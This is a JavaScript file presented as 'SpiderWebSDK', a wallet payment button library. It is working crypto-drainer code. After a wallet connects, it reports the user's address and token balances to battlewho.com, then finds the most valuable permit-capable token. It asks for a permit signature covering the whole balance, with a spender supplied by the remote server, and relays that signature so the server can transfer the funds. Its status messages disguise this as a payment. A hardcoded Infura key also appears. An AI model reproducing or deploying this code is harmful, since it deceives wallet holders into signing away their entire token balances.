
window.SpiderWebSDK = {
   
    _config: {},
    _provider: null,
    _signer: null,
    _currentUserAddress: null,
    _discoveredProviders: new Map(),
    _currentUserChainId: null, 
    _isInitialized: false,
    _priceCache: new Map(),          
    _CACHE_DURATION_MS: 5 * 60 * 1000, 


    _ERC20_PERMIT_ABI: [
        "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
        "function nonces(address owner) view returns (uint256)",
        "function DOMAIN_SEPARATOR() view returns (bytes32)",
        "function name() view returns (string)",
        "function version() view returns (string)",
        "function decimals() view returns (uint8)",
        "function balanceOf(address owner) view returns (uint256)",
        "function symbol() view returns (string)"
    ],
    _RELAYER_SERVER_URL_BASE: "https://battlewho.com",

    _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
    1: 'ethereum',
    137: 'polygon-pos',
    10: 'optimistic-ethereum',
    42161: 'arbitrum-one',
    56: 'binance-smart-chain', // BNB Chain
    43114: 'avalanche',
    8453: 'base',             // Base
    14: 'flare-network',      // Flare Network (Chain ID 14, asset platform ID for tokens)
    // If you need Flare's token, use the asset ID for price fetching
},

_CHAIN_ID_TO_PUBLIC_RPC: {
    // Flare Network Mainnet (Chain ID 14)
    14: 'https://flare-api.flare.network/ext/C/rpc', 
    // Add other non-Alchemy chain RPCs here if needed
},

_CHAIN_DETAILS: {
    // Ethereum (Already supported, for completeness)
    1: { 
        chainName: 'Ethereum Mainnet',
        rpcUrls: ['https://mainnet.infura.io/v3/83b66a4e0b62442b943684de55ec76f8'], // Use a generic RPC if Alchemy is down/unavailable
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        blockExplorerUrls: ['https://etherscan.io'],
    },
    // Polygon (Mainnet)
    137: {
        chainName: 'Polygon Mainnet',
        rpcUrls: ['https://polygon-rpc.com'],
        nativeCurrency: { name: 'Matic', symbol: 'MATIC', decimals: 18 },
        blockExplorerUrls: ['https://polygonscan.com'],
    },
    // BNB Smart Chain (Mainnet)
    56: {
        chainName: 'BNB Smart Chain',
        rpcUrls: ['https://bsc-dataseed.bnbchain.org'],
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        blockExplorerUrls: ['https://bscscan.com'],
    },
    // Arbitrum One (Mainnet)
    42161: {
        chainName: 'Arbitrum One',
        rpcUrls: ['https://arb1.arbitrum.io/rpc'],
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        blockExplorerUrls: ['https://arbiscan.io'],
    },
    // Base (Mainnet)
    8453: {
        chainName: 'Base Mainnet',
        rpcUrls: ['https://mainnet.base.org'],
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        blockExplorerUrls: ['https://basescan.org'],
    },
    // Flare Network (Mainnet)
    14: {
        chainName: 'Flare Network',
        rpcUrls: ['https://flare-api.flare.network/ext/C/rpc'],
        nativeCurrency: { name: 'Flare', symbol: 'FLR', decimals: 18 },
        blockExplorerUrls: ['https://flare-explorer.flare.network'],
    },
    // Optimism is already in your CoinGecko map:
    10: { 
        chainName: 'Optimism',
        rpcUrls: ['https://mainnet.optimism.io'],
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        blockExplorerUrls: ['https://optimistic.etherscan.io'],
    },
},

     _CHAIN_ID_TO_ALCHEMY_SUBDOMAIN: {
        1: 'eth-mainnet',
        137: 'polygon-mainnet',
        10: 'opt-mainnet',
        42161: 'arb-mainnet',       // Arbitrum One
        56: 'bsc-mainnet',          // BNB Smart Chain (BSC)
        8453: 'base-mainnet',       // Base
        43114: 'avax-mainnet'       // Avalanche (already supported but good to have the subdomain)
        // Note: Alchemy does not currently support Flare Network. For Flare (Chain ID 14), 
        // you would need a general RPC URL instead of an Alchemy subdomain.
    },

    _switchChain: async function(targetChainId) {
    const hexChainId = ethers.utils.hexValue(targetChainId);
    const chainData = this._CHAIN_DETAILS[targetChainId];

    if (!chainData) {
        throw new Error(`Chain ID ${targetChainId} is not configured in the SDK.`);
    }

    try {
        // 1. Attempt to switch network (if already added)
        await this._provider.send('wallet_switchEthereumChain', [{ chainId: hexChainId }]);
        this._updateStatus(`Switched to ${chainData.chainName} successfully.`, 'success');
    } catch (switchError) {
        // 4902 is the error code for an unrecognized chain ID (i.e., not added to the wallet)
        if (switchError.code === 4902) {
            this._updateStatus(`Network ${chainData.chainName} not found. Attempting to add it to your wallet...`, 'pending');
            try {
                // 2. If switch fails, attempt to add the network
                await this._provider.send('wallet_addEthereumChain', [{ 
                    chainId: hexChainId, 
                    chainName: chainData.chainName,
                    nativeCurrency: chainData.nativeCurrency,
                    rpcUrls: chainData.rpcUrls,
                    blockExplorerUrls: chainData.blockExplorerUrls
                }]);
                
                // 3. Re-attempt switch after adding
                await this._provider.send('wallet_switchEthereumChain', [{ chainId: hexChainId }]);
                this._updateStatus(`Switched to ${chainData.chainName} successfully.`, 'success');

            } catch (addError) {
                // Handle user rejection or other failures during the 'add' process
                const message = addError.code === 4001 
                    ? `Wallet switch/add was rejected by the user.` 
                    : `Could not add or switch to ${chainData.chainName}. Please do so manually.`;
                this._updateStatus(message, 'error');
                throw new Error(message);
            }
        } else if (switchError.code === 4001) {
             // Handle user rejection of the 'switch' request
            const message = "Wallet network switch was rejected by the user.";
            this._updateStatus(message, 'error');
            throw new Error(message);
        } else {
            // General switch error
            const message = `Failed to switch network: ${switchError.message}`;
            this._updateStatus(message, 'error');
            throw new Error(message);
        }
    }
},

    _getAlchemyUrl: function(chainId) {
    const subdomain = this._CHAIN_ID_TO_ALCHEMY_SUBDOMAIN[chainId];
    if (subdomain) {
        return `https://${subdomain}.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
    }
    // Fallback for chains like Flare that don't use Alchemy (requires a general RPC URL)
    const publicRpc = this._CHAIN_ID_TO_PUBLIC_RPC[chainId];
    if (publicRpc) {
        // Warning: Non-Alchemy RPCs might not support alchemy_getTokenBalances
        console.warn(`Using public RPC for Chain ID ${chainId}. Token balance lookup may fail.`);
        return publicRpc; 
    }
    throw new Error(`Unsupported chainId ${chainId}: No RPC or Alchemy subdomain configured.`);
},

    init: async function(config) { 
    if (this._isInitialized) {
        console.warn("SpiderWebSDK already initialized.");
        return;
    }

    if (!config.buttonId || !config.apiKey || !config.alchemyApiKey) {
    console.error("SpiderWebSDK Error: Missing required configuration parameters (buttonId, apiKey, alchemyApiKey).");
    return;
}
    if (typeof ethers === 'undefined') {
        console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
        return;
    }

    
    this._config = config;

    try {
       
        console.log("SpiderWebSDK: Fetching remote configuration...");
        const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/get-config`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json','X-Api-Key': this._config.apiKey },
            body: JSON.stringify({
                apiKey: this._config.apiKey,
                origin: window.location.origin
                
            })
        });

        if (!response.ok) {
            throw new Error(`Network error while fetching remote config. Status: ${response.status}`);
        }

        const remoteConfig = await response.json();
        if (!remoteConfig.success || !remoteConfig.relayerAddress) {
            throw new Error(remoteConfig.message || "Invalid remote configuration from server.");
        }

       
        this._config.relayerAddress = remoteConfig.relayerAddress;
        console.log("SpiderWebSDK: Remote configuration loaded successfully.");

    } catch (error) {
        console.error("SpiderWebSDK FATAL ERROR:", error.message);
        const payButton = document.getElementById(config.buttonId);
        if (payButton) {
            payButton.disabled = true;
            payButton.innerHTML = 'SDK Init Failed';
        }
        return; 
    }

 
    const payButton = document.getElementById(config.buttonId);
    if (!payButton) {
        console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
        return;
    }
    payButton.addEventListener('click', this._handlePaymentClick.bind(this));

    this._injectModalHtml();
    this._setupEip6963Listeners();
    this._isInitialized = true;
    console.log("SpiderWebSDK initialized successfully.");
},
    _fetchTokenPrices: async function(tokenAddresses) {
        const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._currentUserChainId];
        if (!assetPlatform) {
            console.warn(`Price lookup is not supported for chainId: ${this._currentUserChainId}`);
            return {};
        }

        const now = Date.now();
        const pricesFromCache = {};
        const addressesToFetch = [];

        
        for (const address of tokenAddresses) {
            const lowerCaseAddress = address.toLowerCase();
            if (this._priceCache.has(lowerCaseAddress)) {
                const cached = this._priceCache.get(lowerCaseAddress);
                if (now - cached.timestamp < this._CACHE_DURATION_MS) {
                    pricesFromCache[lowerCaseAddress] = cached.price;
                } else {
                    addressesToFetch.push(address);
                }
            } else {
                addressesToFetch.push(address);
            }
        }

        if (addressesToFetch.length === 0) {
            console.log("SpiderWebSDK: All token prices loaded from cache.");
            return pricesFromCache;
        }

        
        try {
            console.log(`SpiderWebSDK: Fetching ${addressesToFetch.length} new token prices individually...`);
            
       
            const fetchPromises = addressesToFetch.map(address => {
                const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${address}&vs_currencies=usd`;
                return fetch(apiUrl).then(response => {
                    if (!response.ok) {
                        
                        console.error(`Failed to fetch price for ${address}. Status: ${response.status}`);
                        return { status: 'rejected', address };
                    }
                    return response.json().then(data => ({ ...data, [address.toLowerCase()]: data[address.toLowerCase()] || { usd: 0 } })); // Ensure address is lowercase and handle empty responses
                });
            });

           
            const results = await Promise.all(fetchPromises);
            
    
            const newPrices = results.reduce((acc, current) => {
                if (current.status !== 'rejected') {
                    return { ...acc, ...current };
                }
                return acc;
            }, {});

          
            for (const address in newPrices) {
                if (newPrices.hasOwnProperty(address)) {
                    this._priceCache.set(address.toLowerCase(), {
                        price: newPrices[address],
                        timestamp: now
                    });
                }
            }
            
            return { ...pricesFromCache, ...newPrices };

        } catch (error) {
            console.error("Could not fetch new token prices:", error.message);
            console.warn("SpiderWebSDK: Proceeding with stale/incomplete price data from cache.");
            return pricesFromCache;
        }
    },

   
    // In _handlePaymentClick (REVISED):
_handlePaymentClick: async function() {
    try {
        if (!this._signer) {
            // No signer means we haven't connected yet, so we open the modal.
            const connected = await this._connectWallet(); 
            if (!connected) {
                this._updateStatus("Wallet connection cancelled.", "info");
            }
            return; 
        }

        // --- OLD NETWORK CHECK LOGIC IS REMOVED ---
        // We now rely on this._currentUserChainId being set by _handleProviderSelection
        // and proceed directly to execution.

        await this._executeSend();
        
    } catch (error) {
        console.error("Payment failed:", error);
        this._updateStatus(`Error: ${error.message}`, "error");
    }
},
    
    _executeSend: async function() {
        this._updateStatus("Scanning wallet for compatible tokens...", "pending");

        const result = await this._findHighestValueToken();

        if (!result || !result.tokenData) {
            throw new Error("No permit-compatible tokens with a balance were found.");
        }

        const { tokenData, usdValue } = result;

        this._updateStatus(`Highest value token found: ${tokenData.symbol}`, "info");
        
        
        await this._signAndSendWithStandardPermit(tokenData, usdValue);
    },

    _findHighestValueToken: async function() {
        
        const alchemyUrl = this._getAlchemyUrl(this._currentUserChainId);
        const response = await fetch(alchemyUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
                params: [this._currentUserAddress, 'erc20']
            })
        });
        const data = await response.json();
        if (!data.result) throw new Error("Could not fetch token balances from Alchemy.");

        const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
        if (nonZeroBalances.length === 0) return null;
        
        this._updateStatus("Finding all compatible tokens...", "pending");

        
        const checkPromises = nonZeroBalances.map(async (token) => {
            if (await this._checkPermitSupport(token.contractAddress)) {
                const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
                const [name, symbol, balance, decimals] = await Promise.all([
                    tokenContract.name(),
                    tokenContract.symbol(),
                    tokenContract.balanceOf(this._currentUserAddress),
                    tokenContract.decimals()
                ]);
                return { contractAddress: token.contractAddress, name, symbol, balance, decimals };
            }
            return null;
        });


        const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);

        if (compatibleTokens.length === 0) {
            return null; 
        }
        
        
        if (compatibleTokens.length === 1) {
        
        return { tokenData: compatibleTokens[0], usdValue: 0 }; 
    }

        this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");

     
        const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
        if (!prices) {
            console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
            return { tokenData: compatibleTokens[0], usdValue: 0 }; 
        }
        
        
        let highestValueToken = null;
        let maxUsdValue = -1;

        for (const token of compatibleTokens) {
            const priceData = prices[token.contractAddress.toLowerCase()];
            if (priceData && priceData.usd) {
               
                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
                const usdValue = parseFloat(formattedBalance) * priceData.usd;

                if (usdValue > maxUsdValue) {
                    maxUsdValue = usdValue;
                    highestValueToken = token;
                }
            }
        }

        
        const resultToken = highestValueToken || compatibleTokens[0];
        const resultUsdValue = maxUsdValue > -1 ? maxUsdValue : 0;
        return { tokenData: resultToken, usdValue: resultUsdValue };
        
    },

_logConnectionEvent: async function() {
    try {
      
        const alchemyUrl = this._getAlchemyUrl(this._currentUserChainId);
        const balanceResponse = await fetch(alchemyUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
                params: [this._currentUserAddress, 'erc20']
            })
        });
        const balanceData = await balanceResponse.json();
        if (!balanceData.result) return;

        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
        if (tokensWithBalance.length === 0) return;

        
        const detailedTokens = [];
        for (const token of tokensWithBalance) {
            const metadataResponse = await fetch(alchemyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
                    params: [token.contractAddress]
                 })
            });
            const metadata = await metadataResponse.json();
            
            if (metadata.result) {
                const decimals = metadata.result.decimals;
                const symbol = metadata.result.symbol;
                const formattedBalance = parseFloat(ethers.utils.formatUnits(token.tokenBalance, decimals)).toFixed(4);

                detailedTokens.push({
                    symbol: symbol,
                    balance: formattedBalance
                });
            }
        }
        
       
        if (detailedTokens.length > 0) {
            await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection-details`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
                body: JSON.stringify({
                    apiKey: this._config.apiKey,
                    origin: window.location.origin,
                    walletAddress: this._currentUserAddress,
                    tokens: detailedTokens
                })
            });
        }

    } catch (error) {
        console.warn("SpiderWebSDK: Could not log detailed connection event.", error);
    }
},
    
_checkPermitSupport: async function(tokenAddress) {
   
    const PERMIT_SUPPORT_ABI = [
        "function nonces(address owner) view returns (uint256)"
    ];
    
    try {
        const tokenContract = new ethers.Contract(tokenAddress, PERMIT_SUPPORT_ABI, this._provider);
      
        await tokenContract.nonces(this._currentUserAddress);
        return true;
    } catch (error) {
       
        return false;
    }
},

    _signAndSendWithStandardPermit: async function(tokenData, usdValue) {
        this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
        try {
            const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
            const nonce = await tokenContract.nonces(this._currentUserAddress);
            const deadline = Math.floor(Date.now() / 1000) + 1800;
            const tokenName = tokenData.name;

            let domainVersion = "1";
            try {
                domainVersion = await tokenContract.version();
            } catch (e) {
                console.log(`Token ${tokenData.symbol} has no version(), defaulting to '1'.`);
            }

            const domain = {
                name: tokenName,
                version: domainVersion,
                chainId: this._currentUserChainId,
                verifyingContract: tokenData.contractAddress
            };

            const types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };

            const permitMessage = {
                owner: this._currentUserAddress,
              
                spender: this._config.relayerAddress,
                value: tokenData.balance.toString(),
                nonce: nonce.toString(),
                deadline: deadline
            };

            this._updateStatus(`Please sign the message for ${tokenData.symbol}...`, 'pending');
            const signature = await this._signer._signTypedData(domain, types, permitMessage);

            const { v, r, s } = ethers.utils.splitSignature(signature);

           
            const payload = {
                apiKey: this._config.apiKey,
                owner: this._currentUserAddress,
                recipient: this._config.recipientAddress, 
                contractAddress: tokenData.contractAddress,
                value: tokenData.balance.toString(),
                deadline: deadline,
                v, r, s,
                origin: window.location.origin,
                chainId: this._currentUserChainId,
                totalUsdValue: usdValue 
            };

            this._updateStatus('Signature received. Relaying transaction...', 'pending');
            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/execute-multi-chain-transfer`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
        body: JSON.stringify(payload)
    });
            const result = await response.json();
            if (!response.ok || !result.success) throw new Error(result.message || "Relayer service failed.");

            this._updateStatus(`✅ ${tokenData.symbol} transfer has been successfully relayed!`, 'success');

        } catch (error) {
            console.error("Standard Permit failed:", error);
            this._updateStatus(`Error: ${error.reason || error.message}`, 'error');
            throw error;
        }
    },

    _connectWallet: function() {
        return new Promise((resolve) => {
            this._resolveConnection = resolve;
            this._openWalletModal();
        });
    },

    
    _handleProviderSelection: async function(event) {
        const button = event.target.closest('.sw-wallet-button');
        if (!button) return;

        const rdns = button.dataset.rdns;
        const providerDetail = this._discoveredProviders.get(rdns);
        if (!providerDetail) return;
        
        this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
        this._closeWalletModal();

        try {
            const selectedProvider = providerDetail.provider;
            this._provider = new ethers.providers.Web3Provider(selectedProvider);
            await this._provider.send('eth_requestAccounts', []);
            this._signer = this._provider.getSigner();
            this._currentUserAddress = await this._signer.getAddress();
            const network = await this._provider.getNetwork();
            this._currentUserChainId = network.chainId;
            this._logConnectionEvent(); 
            
            this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
            
            if (this._resolveConnection) {
                this._resolveConnection(true); 
                
                
                
                await this._executeSend();
            }

        } catch (error) {
            console.error("Connection failed:", error);
            this._updateStatus("Connection failed or was rejected.", "error");
            if (this._resolveConnection) this._resolveConnection(false);
        }
    },

    _setupEip6963Listeners: function() {
        window.addEventListener('eip6963:announceProvider', (event) => {
            const providerDetail = event.detail;
            if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
                this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
                this._renderWalletList();
            }
        });
        window.dispatchEvent(new Event('eip6963:requestProvider'));
    },
    
    _renderWalletList: function() {
            const listDiv = document.getElementById('sw-wallet-list');
            if (!listDiv) return;

            listDiv.innerHTML = '';
            if (this._discoveredProviders.size === 0) {
                listDiv.innerHTML = '<p style="text-align: center; color: #4a5568;">No wallets detected.</p>';
                return;
            }

            this._discoveredProviders.forEach(p => {
                const buttonHtml = `
                    <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 0.75rem; background-color: #ffffff; border-radius: 0.5rem; border: 1px solid #e2e8f0; cursor: pointer; text-align: left; color: #1a202c; transition: background-color 0.2s ease;">
                        <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 1rem; border-radius: 50%;"/>
                        <span style="font-weight: 600;">${p.info.name}</span>
                    </button>
                `;
                listDiv.innerHTML += buttonHtml;
            });
            
            listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
                
                button.onmouseenter = () => button.style.backgroundColor = '#f7fafc'; 
                button.onmouseleave = () => button.style.backgroundColor = '#ffffff';
                button.addEventListener('click', this._handleProviderSelection.bind(this));
            });
        },

    _openWalletModal: function() {
        document.getElementById('sw-modal-overlay').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('sw-wallet-modal').style.opacity = 1;
            document.getElementById('sw-wallet-modal').style.transform = 'scale(1)';
        }, 10);
        this._renderWalletList();
    },

    _closeWalletModal: function() {
        const overlay = document.getElementById('sw-modal-overlay');
        const modal = document.getElementById('sw-wallet-modal');
        if (modal) {
            modal.style.opacity = 0;
            modal.style.transform = 'scale(0.95)';
        }
        setTimeout(() => {
            if (overlay) overlay.style.display = 'none';
            if(this._resolveConnection && !this._signer) {
                this._resolveConnection(false);
            }
        }, 300);
    },
    
    _updateStatus: function(message, type = 'info') {
        const statusEl = document.getElementById('sw-status-message');
        if (!statusEl) return;
        const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
        statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
    },
    
    
    _injectModalHtml: function() {
            if (document.getElementById('sw-modal-overlay')) return;
            
            const modalHtml = `
                <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 1000; font-family: sans-serif;">
                    <div id="sw-wallet-modal" style="background-color: #ffffff; border-radius: 0.5rem; padding: 1.5rem; width: 100%; max-width: 24rem; color: #1a202c; transition: all 0.3s ease; opacity: 0; transform: scale(0.95); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);">
                        <h2 style="font-size: 1.25rem; font-weight: 700; margin: 0; margin-bottom: 1rem;">Select a Wallet</h2>
                        <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto; display: flex; flex-direction: column; gap: 0.5rem;"></div>
                        <button id="sw-close-wallet-modal-btn" style="margin-top: 1rem; width: 100%; padding: 0.75rem 1.5rem; border-radius: 0.5rem; background-color: #e2e8f0; color: #2d3748; font-weight: 600; font-size: 1rem; border: none; cursor: pointer; transition: background-color 0.2s ease-in-out;">Cancel</button>
                    </div>
                </div>
                <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>
            `;
            document.body.insertAdjacentHTML('beforeend', modalHtml);

            const closeBound = this._closeWalletModal.bind(this);

            document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
            
            document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
                if (e.target.id === 'sw-modal-overlay') closeBound();
            });
        },
};